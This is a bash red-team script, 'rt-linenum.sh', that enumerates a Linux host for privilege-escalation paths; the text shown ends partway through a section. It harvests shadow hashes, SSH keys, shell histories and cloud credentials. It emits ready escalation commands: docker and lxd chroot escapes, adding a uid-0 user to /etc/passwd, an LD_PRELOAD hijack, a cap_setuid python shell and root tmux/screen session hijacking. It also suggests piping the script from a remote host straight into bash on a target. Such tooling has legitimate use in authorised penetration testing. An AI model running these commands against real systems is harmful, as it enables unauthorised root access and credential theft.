#!/usr/bin/env bash
# EnumGod - Red Team Enumeration Toolkit   |   Author: Jeet Ramoliya
# ============================================================================
# rt-linenum.sh  -  Red Team LOCAL enumeration & privilege-escalation triage
#                   for Linux hosts. A LinPEAS-lite with a ranked findings
#                   model that matches Invoke-RTEnum.ps1 (Windows).
#
# GOAL     One pass -> a timestamped loot dir with ranked HIGH/MED/INFO
#          findings, per-section dumps, a NEXT_STEPS file of pre-filled
#          escalation commands, and optional findings.json.
#
# DESIGN   Read-only. No dependencies beyond coreutils; every probe degrades
#          gracefully when a tool/path is missing. Safe to re-run per hop.
#
# USAGE    ./rt-linenum.sh                 # full local triage -> ./rtenum_<host>_<ts>/
#          ./rt-linenum.sh -o /dev/shm     # choose output base dir
#          ./rt-linenum.sh -q              # quick (skip slow full-FS SUID/world-write walks)
#          ./rt-linenum.sh -j              # also write findings.json
#          ./rt-linenum.sh --only creds,suid,sudo
#          ./rt-linenum.sh --skip network
#
#          Tip: curl it to memory on a target with no disk write you want kept:
#            bash <(curl -s http://you/rt-linenum.sh) -o /dev/shm
# ============================================================================
set -u

# ----------------------------- framework -----------------------------
OUTBASE="."
QUICK=0
JSON=0
ONLY=""
SKIP=""
while [ $# -gt 0 ]; do
  case "$1" in
    -o) OUTBASE="$2"; shift 2;;
    -q|--quick) QUICK=1; shift;;
    -j|--json) JSON=1; shift;;
    --only) ONLY="$2"; shift 2;;
    --skip) SKIP="$2"; shift 2;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
    *) echo "unknown arg: $1"; exit 1;;
  esac
done

HOST=$(hostname 2>/dev/null || echo unknown)
TS=$(date +%Y%m%d_%H%M%S)
RUN="${OUTBASE%/}/rtenum_${HOST}_${TS}"
mkdir -p "$RUN" 2>/dev/null || { echo "[-] cannot create $RUN"; exit 1; }

# colors (disabled if not a tty)
if [ -t 1 ]; then R=$'\e[31m'; Y=$'\e[33m'; C=$'\e[36m'; G=$'\e[32m'; D=$'\e[90m'; N=$'\e[0m'; else R=; Y=; C=; G=; D=; N=; fi

SUMMARY="$RUN/00_SUMMARY.txt"
NEXT="$RUN/NEXT_STEPS.txt"
JFILE="$RUN/findings.json"
: > "$SUMMARY"; : > "$NEXT"
HIGHN=0; MEDN=0; INFON=0
declare -a J_HIGH=() J_MED=() J_INFO=() J_NEXT=()

sect(){ printf '\n%s[==== %s ====]%s\n' "$C" "$1" "$N"; }
# flag SEV "text"
flag(){
  sev="$1"; shift; txt="$*"
  case "$sev" in
    HIGH) col=$R; tag="[HIGH]"; HIGHN=$((HIGHN+1)); J_HIGH+=("$txt");;
    MED)  col=$Y; tag="[MED ]"; MEDN=$((MEDN+1));  J_MED+=("$txt");;
    *)    col=$D; tag="[INFO]"; INFON=$((INFON+1)); J_INFO+=("$txt");;
  esac
  printf '%s%s %s%s\n' "$col" "$tag" "$txt" "$N"
  printf '%s %s\n' "$tag" "$txt" >> "$SUMMARY"
}
# nextstep "title" "command"
nextstep(){ printf '[*] %s\n    %s\n\n' "$1" "$2" >> "$NEXT"; J_NEXT+=("$1 :: $2"); }
save(){ cat > "$RUN/$1"; }   # usage: some_cmd | save 01_x.txt
# section gate
runs(){
  # args: keyword list for this section
  if [ -n "$SKIP" ]; then for k in "$@"; do case ",$SKIP," in *",$k,"*) return 1;; esac; done; fi
  if [ -n "$ONLY" ]; then for k in "$@"; do case ",$ONLY," in *",$k,"*) return 0;; esac; done; return 1; fi
  return 0
}
has(){ command -v "$1" >/dev/null 2>&1; }
# timeout-guard for heavy filesystem walks (prevents hangs on network mounts / proc loops)
if has timeout; then TG(){ timeout 90 "$@"; }; else TG(){ "$@"; }; fi

enumgod_banner(){
  printf '%s' "${C:-}"
  cat <<'ART'
 _____                        ____           _
| ____|_ __  _   _ _ __ ___  / ___| ___   __| |
|  _| | '_ \| | | | '_ ` _ \| |  _ / _ \ / _` |
| |___| | | | |_| | | | | | | |_| | (_) | (_| |
|_____|_| |_|\__,_|_| |_| |_|\____|\___/ \__,_|
ART
  printf '%s   EnumGod  Red Team Enumeration Toolkit%s\n' "${G:-}" "${N:-}"
  printf '%s   author : Jeet Ramoliya   module : %s%s\n\n' "${D:-}" "$1" "${N:-}"
}
enumgod_banner "Linux local privesc (linPEAS-style)"
echo "${G}[*] rt-linenum  ->  $RUN${N}"
echo "${D}[*] $(date)  as $(id -un 2>/dev/null)  quick=$QUICK${N}"

# ----------------------------- context -----------------------------
if runs context id sudo; then
  sect "Current context (id, groups, sudo)"
  {
    echo "== id =="; id 2>/dev/null
    echo; echo "== whoami / groups =="; whoami 2>/dev/null; groups 2>/dev/null
    echo; echo "== sudo -l (non-interactive) =="; sudo -n -l 2>/dev/null
  } | save 00_context.txt

  MYUID=$(id -u 2>/dev/null)
  [ "$MYUID" = "0" ] && flag MED "Already running as root (uid 0)."

  # dangerous group memberships
  GRPS=$(id -Gn 2>/dev/null)
  case " $GRPS " in
    *" docker "*)  flag HIGH "Member of 'docker' group -> trivially root via the Docker socket."
                   nextstep "docker group -> root" "docker run -v /:/mnt --rm -it alpine chroot /mnt sh";;
  esac
  case " $GRPS " in
    *" lxd "*|*" lxc "*) flag HIGH "Member of 'lxd/lxc' group -> mount host FS in a privileged container -> root."
                         nextstep "lxd group -> root" "lxc init alpine r -c security.privileged=true; lxc config device add r d disk source=/ path=/mnt/root recursive=true; lxc start r; lxc exec r sh";;
  esac
  case " $GRPS " in
    *" disk "*)  flag HIGH "Member of 'disk' group -> raw block access -> read/modify any file (debugfs)."
                 nextstep "disk group -> root" "debugfs -w /dev/sda1  # then edit /etc/shadow or read any file";;
  esac
  case " $GRPS " in
    *" adm "*)   flag INFO "Member of 'adm' group -> read system logs (creds often leak there).";;
    *" sudo "*|*" wheel "*) flag INFO "Member of sudo/wheel group (check 'sudo -l').";;
    *" shadow "*) flag HIGH "Member of 'shadow' group -> read /etc/shadow -> offline crack."; nextstep "shadow group" "cat /etc/shadow | tee shadow.txt  # john/hashcat";;
  esac

  # sudo -l results
  SUDOL=$(sudo -n -l 2>/dev/null)
  if [ -n "$SUDOL" ]; then
    echo "$SUDOL" | grep -qi 'NOPASSWD' && flag HIGH "sudo NOPASSWD entries present (see 00_context.txt) -> check GTFOBins for each binary."
    echo "$SUDOL" | grep -qi '(ALL.*: *ALL) *ALL' && flag HIGH "sudo ALL:ALL -> full root: sudo su -"
    echo "$SUDOL" | grep -Eqi '/(vi|vim|nano|less|more|awk|find|python|perl|ruby|nmap|tar|zip|env|bash|sh|man|ftp|gdb|docker|systemctl)' && \
      { flag HIGH "sudo allows a GTFOBins-abusable binary -> root."; nextstep "sudo GTFOBins" "# e.g. sudo find . -exec /bin/sh \\; -quit   |   sudo vim -c ':!/bin/sh'   |   check gtfobins.github.io"; }
  fi
fi

# ----------------------------- system / kernel -----------------------------
if runs system kernel os; then
  sect "System, kernel & distro (exploit hints)"
  {
    echo "== uname =="; uname -a 2>/dev/null
    echo; echo "== os-release =="; cat /etc/os-release 2>/dev/null || cat /etc/*release 2>/dev/null
    echo; echo "== sudo version =="; sudo --version 2>/dev/null | head -1
  } | save 01_system.txt

  KREL=$(uname -r 2>/dev/null)
  KMAJ=$(echo "$KREL" | cut -d. -f1); KMIN=$(echo "$KREL" | cut -d. -f2)
  flag INFO "Kernel: $KREL"
  # Dirty Pipe (5.8 - 5.16.11)
  if [ -n "$KMAJ" ] && [ "$KMAJ" -eq 5 ] 2>/dev/null && [ -n "$KMIN" ] && [ "$KMIN" -ge 8 ] 2>/dev/null && [ "$KMIN" -le 16 ] 2>/dev/null; then
    flag HIGH "Kernel $KREL in Dirty Pipe range (CVE-2022-0847) -> overwrite read-only files -> root."
    nextstep "Dirty Pipe" "# build & run CVE-2022-0847 PoC (writes to /etc/passwd or a suid binary)"
  fi
  # pkexec PwnKit (polkit) - presence of setuid pkexec is the signal
  if [ -u /usr/bin/pkexec ] 2>/dev/null; then
    flag HIGH "setuid pkexec present -> PwnKit (CVE-2021-4034) likely exploitable -> root."
    nextstep "PwnKit" "# build CVE-2021-4034 PoC; works on most unpatched polkit"
  fi
  # sudo Baron Samedit (< 1.9.5p2)
  SV=$(sudo --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+p?[0-9]*')
  [ -n "$SV" ] && flag INFO "sudo $SV - if < 1.9.5p2 check Baron Samedit (CVE-2021-3156)."
  has gcc && flag INFO "gcc present -> can compile kernel/local exploits on-host."
fi

# ----------------------------- CONFIRMED CVE matching -----------------------------
# Only CONFIRMED vulns reach the main findings. A matched row is SUPPRESSED when:
#   - the running kernel was BUILT after the fix month (distro backport present), or
#   - its precondition fails (e.g. unprivileged user namespaces disabled).
# In-range but unconfirmable -> POTENTIAL side file. Feed CVEs -> awareness side file.
if runs cve kernel vuln; then
  sect "Confirmed local-privesc / kernel CVEs (fix-date + precondition gated)"
  SELFDIR=$(cd "$(dirname "$0")" 2>/dev/null && pwd)
  CVEDB="${CVEDB:-}"
  for cand in "$CVEDB" "$SELFDIR/../data/cve-db.txt" "$SELFDIR/cve-db.txt" "$SELFDIR/data/cve-db.txt" "./data/cve-db.txt"; do
    [ -n "$cand" ] && [ -f "$cand" ] && { CVEDB="$cand"; break; }
  done
  if [ -z "$CVEDB" ] || [ ! -f "$CVEDB" ]; then
    flag INFO "CVE DB not found (expected data/cve-db.txt) - run tools/update-cve-db.sh to fetch it."
  else
    KVER=$(uname -r 2>/dev/null | grep -oE '^[0-9]+\.[0-9]+(\.[0-9]+)?')
    GVER=$(ldd --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
    SVER=$(sudo --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+(p[0-9]+)?')
    # kernel build month (YYYY-MM) from uname -v, best-effort
    KBUILD=$(date -d "$(uname -v 2>/dev/null | grep -oE '[A-Z][a-z]{2} +[0-9]{1,2} .*20[0-9]{2}' | head -1)" +%Y-%m 2>/dev/null)
    # unprivileged user namespaces enabled? (precondition for many modern LPEs)
    USERNS=1
    if [ -r /proc/sys/kernel/unprivileged_userns_clone ]; then [ "$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null)" = "0" ] && USERNS=0; fi
    [ -r /proc/sys/user/max_user_namespaces ] && [ "$(cat /proc/sys/user/max_user_namespaces 2>/dev/null)" = "0" ] && USERNS=0
    flag INFO "Kernel $KVER (built ${KBUILD:-unknown}), glibc ${GVER:-?}, sudo ${SVER:-?}, unpriv-userns=$([ $USERNS = 1 ] && echo on || echo off). DB updated $(awk -F'|' '/^updated/{print $2}' "$CVEDB")."
    vle(){ [ "$(printf '%s\n%s\n' "$1" "$2" | sort -V 2>/dev/null | head -1)" = "$1" ]; }
    inrange(){ v="$1"; lo="$2"; hi="$3"; [ -z "$v" ] && return 1
      [ -n "$lo" ] && [ "$lo" != "0" ] && { vle "$lo" "$v" || return 1; }
      [ -n "$hi" ] && { vle "$v" "$hi" || return 1; }; return 0; }
    : > "$RUN/.conf"; : > "$RUN/.pot"; : > "$RUN/.aw"; CN=0; PN=0; AWN=0
    while IFS='|' read -r os cve name typ mn mx sev expl note fixed precond; do
      case "$os" in linux|glibc|sudo|polkit) ;; *) continue;; esac
      if [ "$mn" = "kev" ]; then AWN=$((AWN+1)); echo "$cve|$name|$note" >> "$RUN/.aw"; continue; fi
      # version/build in affected range?
      inr=0
      case "$os" in
        linux)  inrange "$KVER" "$mn" "$mx" && inr=1;;
        glibc)  inrange "$GVER" "$mn" "$mx" && inr=1;;
        sudo)   [ -n "$SVER" ] && inrange "$SVER" "$mn" "$mx" && inr=1;;
        polkit) [ -u /usr/bin/pkexec ] 2>/dev/null && inr=1;;
      esac
      [ "$inr" = "1" ] || continue
      X=""; [ "$expl" = "yes" ] && { X=" *in-the-wild*"; sev=HIGH; }
      # precondition gate
      if [ "$precond" = "userns" ] && [ "$USERNS" = "0" ]; then continue; fi          # not exploitable -> suppress
      if [ "$precond" = "pkexec" ]; then echo "$cve|$name|$note (setuid pkexec present; confirm polkit version)" >> "$RUN/.pot"; PN=$((PN+1)); continue; fi
      # fix-date gate: kernel built after fix month => backport present => suppress
      if [ "$os" = "linux" ] && [ -n "$KBUILD" ] && [ -n "$fixed" ]; then
        if [ "$KBUILD" \> "$fixed" ] || [ "$KBUILD" = "$fixed" ]; then continue; fi    # patched
        flag "$sev" "CONFIRMED $cve ($name)$X - kernel $KVER built $KBUILD predates fix $fixed$([ "$precond" = userns ] && echo ', unpriv-userns ON') -> $note."
        echo "$cve|CONFIRMED (built $KBUILD < fix $fixed)|$note" >> "$RUN/.conf"; CN=$((CN+1)); continue
      fi
      # sudo / glibc: exact version in affected range IS the confirmation
      if [ "$os" = "sudo" ] || [ "$os" = "glibc" ]; then
        flag "$sev" "CONFIRMED $cve ($name)$X - $os $([ "$os" = sudo ] && echo "$SVER" || echo "$GVER") is in the affected range -> $note."
        echo "$cve|CONFIRMED ($os version affected)|$note" >> "$RUN/.conf"; CN=$((CN+1)); continue
      fi
      # linux but build date unknown -> cannot confirm offline
      echo "$cve|$name|$note (kernel in range; build date unknown - verify distro tracker)" >> "$RUN/.pot"; PN=$((PN+1))
    done < "$CVEDB"
    [ "$CN" -gt 0 ] && cp "$RUN/.conf" "$RUN/01b_cve_confirmed.txt"
    [ "$CN" -eq 0 ] && flag INFO "No CVE could be CONFIRMED vulnerable on this host (patched or preconditions not met)."
    if [ "$PN" -gt 0 ]; then { echo "# in-range but UNCONFIRMED offline (verify against your distro security tracker)"; cat "$RUN/.pot"; } > "$RUN/01c_cve_potential.txt"; flag INFO "$PN in-range CVE(s) could not be confirmed offline -> 01c_cve_potential.txt (not counted as findings)."; fi
    [ "$AWN" -gt 0 ] && { cp "$RUN/.aw" "$RUN/01d_cve_latest_feed.txt"; flag INFO "$AWN latest actively-exploited feed CVE(s) -> 01d_cve_latest_feed.txt (awareness, not host-matched)."; }
    [ "$CN" -gt 0 ] && nextstep "Exploit a CONFIRMED CVE" "# fetch a PoC for the CONFIRMED CVE(s) in 01b_cve_confirmed.txt (verify kernel exactly first)"
    rm -f "$RUN/.conf" "$RUN/.pot" "$RUN/.aw" 2>/dev/null
  fi
fi

# ----------------------------- SUID / SGID / caps -----------------------------
if runs suid sgid caps privesc; then
  sect "SUID / SGID binaries & capabilities"
  if [ "$QUICK" = "1" ]; then SEARCH="/usr/bin /usr/sbin /bin /sbin /usr/local/bin /usr/local/sbin"; else SEARCH="/"; fi
  SUIDLIST=$(TG find $SEARCH -perm -4000 -type f 2>/dev/null)
  echo "$SUIDLIST" | save 02_suid.txt
  # known GTFOBins-abusable SUID names
  GTFO='nmap|vim|find|bash|more|less|nano|cp|mv|awk|perl|python|ruby|env|tar|zip|gdb|man|make|dmesg|docker|systemctl|nohup|socat|cpan|pico|rvim|flock|ionice|taskset|time'
  echo "$SUIDLIST" | grep -Ev '^$' | while read -r b; do
    base=$(basename "$b")
    echo "$base" | grep -Eq "^($GTFO)$" && echo "SUIDGTFO:$b"
  done | while read -r line; do :; done
  HITS=$(echo "$SUIDLIST" | while read -r b; do base=$(basename "$b" 2>/dev/null); echo "$base" | grep -Eq "^($GTFO)$" && echo "$b"; done)
  if [ -n "$HITS" ]; then
    flag HIGH "SUID GTFOBins binaries present: $(echo "$HITS" | tr '\n' ' ')"
    nextstep "SUID GTFOBins" "# e.g. ./find . -exec /bin/sh -p \\; -quit  ;  check gtfobins.github.io for each (use -p to keep euid)"
  fi
  # non-standard SUID (not in a common allowlist) worth manual review
  echo "$SUIDLIST" | grep -Ev '/(sudo|su|mount|umount|passwd|chsh|chfn|gpasswd|newgrp|ping|pkexec|fusermount|ssh-keysign|dbus-daemon-launch-helper|polkit|unix_chkpwd|at|crontab|snap-confine|chrome-sandbox|sg|expiry)$' 2>/dev/null \
    | grep -Ev '^$' | head -20 | sed 's/^/  non-standard SUID: /' >> "$RUN/02_suid.txt"

  if has getcap; then
    sect "File capabilities (getcap)"
    CAPS=$( (TG getcap -r / 2>/dev/null) || true)
    echo "$CAPS" | save 02b_caps.txt
    echo "$CAPS" | grep -Eq 'cap_setuid|cap_dac_override|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace' && {
      flag HIGH "Dangerous file capability set (cap_setuid/dac_*/sys_admin): see 02b_caps.txt -> likely root."
      nextstep "capability abuse" "# e.g. python3 with cap_setuid+ep: ./python -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'"
    }
  fi
fi

# ----------------------------- cron / timers -----------------------------
if runs cron timers tasks; then
  sect "Cron jobs & systemd timers (writable targets)"
  {
    echo "== /etc/crontab =="; cat /etc/crontab 2>/dev/null
    echo; echo "== /etc/cron.d =="; ls -la /etc/cron.d 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
    echo; echo "== cron.{hourly,daily} =="; ls -la /etc/cron.hourly /etc/cron.daily 2>/dev/null
    echo; echo "== user crontab =="; crontab -l 2>/dev/null
    echo; echo "== systemd timers =="; systemctl list-timers --all 2>/dev/null
  } | save 03_cron.txt
  # writable scripts referenced by cron
  for f in /etc/crontab /etc/cron.d/*; do
    [ -f "$f" ] || continue
    awk '{for(i=6;i<=NF;i++) if($i ~ /^\//) print $i}' "$f" 2>/dev/null | while read -r scr; do
      [ -w "$scr" ] 2>/dev/null && flag HIGH "Cron runs a WRITABLE script: $scr (edit it -> code exec as the cron user/root)."
    done
  done
  # world-writable scripts in cron dirs
  find /etc/cron* -type f -perm -002 2>/dev/null | while read -r f; do flag HIGH "World-writable cron file: $f"; done
fi

# ----------------------------- writable sensitive files -----------------------------
if runs writable files passwd privesc; then
  sect "Writable sensitive files & PATH"
  [ -w /etc/passwd ] && { flag HIGH "/etc/passwd is WRITABLE -> add a root user."; nextstep "writable /etc/passwd" "openssl passwd -1 -salt x pass  ->  echo 'r:HASH:0:0::/root:/bin/bash' >> /etc/passwd ; su r"; }
  [ -w /etc/shadow ] && flag HIGH "/etc/shadow is WRITABLE -> replace root hash."
  [ -w /etc/sudoers ] && flag HIGH "/etc/sudoers is WRITABLE -> grant yourself NOPASSWD ALL."
  [ -r /etc/shadow ] && flag HIGH "/etc/shadow is READABLE -> offline crack root hash (john/hashcat)."
  # writable dirs in PATH
  echo "$PATH" | tr ':' '\n' | while read -r p; do
    [ -n "$p" ] && [ -d "$p" ] && [ -w "$p" ] && flag MED "Writable directory in PATH: $p (plant a binary to hijack commands)."
  done
  # writable systemd service files
  find /etc/systemd/system /lib/systemd/system -name '*.service' -perm -002 2>/dev/null | while read -r s; do
    flag HIGH "World-writable systemd service: $s -> edit ExecStart -> root on restart."
  done
  # NFS exports with no_root_squash
  if [ -r /etc/exports ]; then
    grep -q 'no_root_squash' /etc/exports 2>/dev/null && { flag HIGH "/etc/exports has no_root_squash -> mount from attacker box, drop SUID root shell."; grep no_root_squash /etc/exports | save 04b_exports.txt; }
  fi
fi

# ----------------------------- deep privesc surface -----------------------------
if runs privesc deep polkit ldpreload wildcard; then
  sect "Deep privesc surface (sudo env, library hijack, wildcard, extra CVEs)"
  dp=""
  # sudo LD_PRELOAD / env_keep (sudo preserves attacker-controlled libs)
  if sudo -n -l 2>/dev/null | grep -Eq 'env_keep\+?=.*LD_PRELOAD|env_keep\+?=.*LD_LIBRARY_PATH|SETENV'; then
    flag HIGH "sudoers preserves LD_PRELOAD/LD_LIBRARY_PATH or allows SETENV -> load a malicious .so as root."
    nextstep "sudo LD_PRELOAD" "build x.so with constructor setuid(0)/system(sh); sudo LD_PRELOAD=/tmp/x.so <allowed-cmd>"
  fi
  # writable library search paths / configs
  for d in /lib /lib64 /usr/lib /usr/lib64 /usr/local/lib; do
    [ -d "$d" ] && [ -w "$d" ] 2>/dev/null && flag HIGH "Writable system library dir: $d -> plant a .so to hijack a root binary."
  done
  [ -w /etc/ld.so.conf ] && flag HIGH "/etc/ld.so.conf is writable -> add a dir -> library hijack."
  if [ -d /etc/ld.so.conf.d ]; then find /etc/ld.so.conf.d -type f -perm -002 2>/dev/null | while read -r f; do flag HIGH "World-writable ld.so.conf.d file: $f -> library path hijack."; done; fi
  # writable profile scripts (run on login, often as the next user)
  for p in /etc/profile /etc/bash.bashrc /etc/environment; do [ -w "$p" ] && flag HIGH "Writable login script: $p -> code exec as next user to log in."; done
  [ -d /etc/profile.d ] && find /etc/profile.d -type f -perm -002 2>/dev/null | while read -r f; do flag HIGH "World-writable /etc/profile.d script: $f."; done
  # SUID/root scripts using wildcards (tar/chown/rsync wildcard injection)
  for f in /etc/cron.d/* /etc/crontab; do
    [ -f "$f" ] || continue
    grep -Eq '(tar|chown|chmod|rsync|zip).*\*' "$f" 2>/dev/null && flag MED "Wildcard in a cron command ($f) -> wildcard-injection privesc (e.g. tar --checkpoint-action)."
  done
  # polkit / pkexec version (PwnKit already flagged in system section; add version detail)
  if command -v pkexec >/dev/null 2>&1; then PKV=$(pkexec --version 2>/dev/null | head -1); dp="$dp\npkexec: $PKV"; fi
  # extra kernel CVE hints by version
  KR=$(uname -r 2>/dev/null); GLIBC=$(ldd --version 2>/dev/null | head -1)
  echo "$GLIBC" | grep -Eq '2\.(3[0-9]|[0-9])$|2\.3[0-6]' && flag INFO "glibc $GLIBC - if 2.34-2.38 check Looney Tunables (CVE-2023-4911, GLIBC_TUNABLES)."
  case "$KR" in
    2.6.*|3.*) flag MED "Old kernel $KR - check DirtyCow (CVE-2016-5195) and overlayfs (CVE-2015-1328).";;
    5.4.*|5.8.*|5.10.*|5.11.*|5.13.*|5.14.*|5.15.*) flag INFO "Kernel $KR - check nf_tables (CVE-2022-32250/2023-32233) and GameOver(lay) CVE-2023-2640/32629 (Ubuntu).";;
  esac
  printf '%b\n' "$dp" | save 04c_deep_privesc.txt
fi

# ----------------------------- credentials on disk -----------------------------
if runs creds credentials secrets keys; then
  sect "Credentials: keys, histories, configs, cloud/kube"
  {
    echo "== SSH private keys (readable) =="
    TG find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | head -40
    echo; echo "== authorized_keys / known_hosts =="
    TG find / -name 'authorized_keys' 2>/dev/null | head -40
  } | save 05_creds.txt
  # readable private keys
  TG find / \( -name 'id_rsa' -o -name '*.pem' -o -name 'id_ed25519' \) -readable 2>/dev/null | head -20 | while read -r k; do
    [ -r "$k" ] && flag MED "Readable private key: $k"
  done
  # history files
  for h in ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history /root/.bash_history; do
    [ -r "$h" ] || continue
    grep -Ei 'pass|pwd|secret|token|key|mysql -u|psql|curl .*-u |ssh |scp ' "$h" 2>/dev/null | head -20 | sed "s|^|$h: |" >> "$RUN/05_creds.txt"
    grep -Eqi 'pass=|password|-p[^ ]|secret|token' "$h" 2>/dev/null && flag MED "Credential-shaped lines in history: $h"
  done
  # cloud / k8s creds
  for c in ~/.aws/credentials ~/.azure ~/.config/gcloud ~/.kube/config /var/run/secrets/kubernetes.io; do
    [ -e "$c" ] && { flag HIGH "Cloud/K8s credential material present: $c -> pivot to cloud (run rt-cloudenum.sh)."; echo "FOUND: $c" >> "$RUN/05_creds.txt"; }
  done
  # .env / config secrets (shallow, common app dirs)
  find /var/www /opt /srv /home /app -maxdepth 4 \( -name '.env' -o -name '*.conf' -o -name 'config.php' -o -name 'settings.py' -o -name 'database.yml' \) 2>/dev/null \
    | head -40 | while read -r f; do
      grep -Eqi 'pass(word)?|secret|api[_-]?key|token|DB_' "$f" 2>/dev/null && { flag MED "Secret-shaped values in config: $f"; echo "CFG: $f" >> "$RUN/05_creds.txt"; }
    done
fi

# ----------------------------- containers -----------------------------
if runs containers docker; then
  sect "Container / escape surface"
  {
    [ -f /.dockerenv ] && echo "/.dockerenv present -> inside a Docker container"
    grep -qa 'docker\|lxc\|kubepods' /proc/1/cgroup 2>/dev/null && echo "cgroup indicates containerized"
    echo "== capsh =="; capsh --print 2>/dev/null
  } | save 06_container.txt
  if [ -f /.dockerenv ] || grep -qa 'docker\|lxc\|kubepods' /proc/1/cgroup 2>/dev/null; then
    flag INFO "Running inside a container - look for escape (privileged, mounted socket, SYS_ADMIN cap)."
  fi
  # docker socket reachable
  if [ -S /var/run/docker.sock ] && [ -w /var/run/docker.sock ]; then
    flag HIGH "Writable /var/run/docker.sock -> spawn a privileged container -> host root."
    nextstep "docker.sock escape" "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
  fi
  # privileged container hint
  capsh --print 2>/dev/null | grep -q 'cap_sys_admin' && flag HIGH "Container holds CAP_SYS_ADMIN -> likely escapable to host."
fi

# ----------------------------- processes / software -----------------------------
if runs processes software; then
  sect "Processes as root with writable binaries"
  ps -eo user,pid,cmd 2>/dev/null | save 07_processes.txt
  # root processes whose executable is writable by us
  ps -eo user,pid,comm 2>/dev/null | awk '$1=="root"{print $2}' | head -200 | while read -r pid; do
    exe=$(readlink -f "/proc/$pid/exe" 2>/dev/null)
    [ -n "$exe" ] && [ -w "$exe" ] 2>/dev/null && flag HIGH "Root process binary is WRITABLE: pid $pid -> $exe"
  done
fi

# ----------------------------- network -----------------------------
if runs network net ports; then
  sect "Network: interfaces, listeners, hosts"
  {
    echo "== interfaces =="; (ip a 2>/dev/null || ifconfig -a 2>/dev/null)
    echo; echo "== routes =="; (ip r 2>/dev/null || route -n 2>/dev/null)
    echo; echo "== listeners =="; (ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null)
    echo; echo "== /etc/hosts =="; cat /etc/hosts 2>/dev/null
    echo; echo "== resolv.conf =="; cat /etc/resolv.conf 2>/dev/null
  } | save 08_network.txt
  # services only on loopback = pivot candidates
  (ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null) | grep -E '127\.0\.0\.1|::1' | grep -qi listen && \
    flag INFO "Loopback-only services present (see 08_network.txt) - port-forward to reach them."
  # is this host domain-joined / AD aware?
  { [ -f /etc/krb5.conf ] || has realm || [ -d /var/lib/sss ]; } && \
    flag INFO "Host looks AD/Kerberos-aware (krb5.conf / sssd / realm) -> run rt-adenum.sh."
fi

# ----------------------------- extended (linPEAS-style) checks -----------------------------
if runs peas extended software files; then
  sect "Extended (linPEAS-style) checks"
  {
    echo "== env =="; env 2>/dev/null
    echo; echo "== umask =="; umask 2>/dev/null
    echo "== ASLR (2=full) =="; cat /proc/sys/kernel/randomize_va_space 2>/dev/null
    echo "== core_pattern =="; cat /proc/sys/kernel/core_pattern 2>/dev/null
    echo; echo "== loaded modules =="; lsmod 2>/dev/null | head -50
    echo; echo "== mounts =="; mount 2>/dev/null
    echo; echo "== fstab =="; cat /etc/fstab 2>/dev/null
    echo; echo "== last logins =="; last -n 15 2>/dev/null
    echo; echo "== logged-in users =="; who 2>/dev/null; w 2>/dev/null
  } | save 09_extended.txt
  # doas (sudo alternative)
  if [ -f /etc/doas.conf ]; then
    grep -iq 'nopass' /etc/doas.conf 2>/dev/null && { flag HIGH "doas NOPASS rule present (/etc/doas.conf) -> run a command as root without a password."; nextstep "doas nopass" "doas -u root /bin/sh"; } || flag MED "doas configured (/etc/doas.conf) - review rules."
  fi
  # readable sensitive password databases
  for f in /etc/shadow /etc/gshadow /etc/security/opasswd; do [ -r "$f" ] && flag HIGH "Readable $f -> offline crack (unshadow + john/hashcat)."; done
  # sshd exposure
  if [ -r /etc/ssh/sshd_config ]; then
    grep -Eiq '^[[:space:]]*PermitRootLogin[[:space:]]+yes' /etc/ssh/sshd_config 2>/dev/null && flag MED "sshd PermitRootLogin yes."
    grep -Eiq '^[[:space:]]*PermitEmptyPasswords[[:space:]]+yes' /etc/ssh/sshd_config 2>/dev/null && flag HIGH "sshd PermitEmptyPasswords yes."
  fi
  # root screen/tmux sockets -> live session hijack
  { ls -d /var/run/screen/S-root 2>/dev/null; ls /tmp/tmux-0/ 2>/dev/null; } | grep -q . && { flag HIGH "root screen/tmux socket present -> attach to root's session (screen -x / tmux -S <sock> attach)."; nextstep "session hijack" "screen -x root/  ;  tmux -S /tmp/tmux-0/default attach"; }
  # other users' tmux/screen (lateral)
  ls /tmp/tmux-* 2>/dev/null | grep -qv 'tmux-0' && flag INFO "Other users' tmux sockets in /tmp (hijack if readable)."
  # mail spools (creds sometimes mailed)
  for m in /var/mail /var/spool/mail; do [ -d "$m" ] && find "$m" -type f -readable 2>/dev/null | head -5 | while read -r mf; do flag INFO "Readable mail spool: $mf"; done; done
  # backup / old files
  TG find /var/backups /etc /home /opt -maxdepth 3 \( -name '*.bak' -o -name '*.old' -o -name '*~' -o -name '*.save' -o -name '*.orig' \) 2>/dev/null | head -25 | sed 's/^/backup-file: /' >> "$RUN/09_extended.txt"
  # databases / dumps on disk
  TG find /home /var /opt /srv -maxdepth 4 \( -name '*.sqlite*' -o -name '*.db' -o -name 'dump.sql' -o -name 'db.sql' \) 2>/dev/null | head -25 | sed 's/^/db-file: /' >> "$RUN/09_extended.txt"
  # creds in logs
  TG grep -rIlE 'password[=: ]|passwd[=: ]|secret|api[_-]?key|token' /var/log 2>/dev/null | head -10 | while read -r f; do flag INFO "Credential-shaped strings in log: $f"; done
  # writable startup / module paths
  find /etc/init.d /etc/update-motd.d /etc/rc.local 2>/dev/null -perm -002 -type f 2>/dev/null | while read -r f; do flag HIGH "World-writable startup script: $f -> code exec as root on boot/login."; done
  { [ -d /lib/modules ] && [ -w /lib/modules ]; } && flag HIGH "/lib/modules is writable -> load a malicious kernel module -> root."
  # files with POSIX ACLs granting us write (getfacl breadth)
  has getfacl && TG getfacl -R -s /etc /opt /var/www 2>/dev/null | grep -B3 -E "user:$(id -un):.*w" 2>/dev/null | grep '# file:' | head -10 | sed 's/# file: /acl-writable: /' >> "$RUN/09_extended.txt"
  # capabilities already covered in SUID/caps section; note interactive-shell interpreters with caps
